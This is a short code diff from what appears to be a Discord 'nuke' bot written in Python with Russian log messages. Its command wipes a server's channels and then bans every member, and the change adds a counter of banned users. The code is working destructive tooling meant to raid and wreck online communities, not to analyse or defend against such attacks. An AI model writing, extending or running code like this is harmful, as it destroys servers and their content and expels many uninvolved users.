@@ -31,8 +31,10 @@ async def lol(ctx):
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Зачистил {channel}")
     print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
     print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
+    ban = 0
     for member in ctx.guild.members:
         try:
+            ban += 1
             await member.ban()
             print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Бан этому{Fore.WHITE}: {member}")
         except:
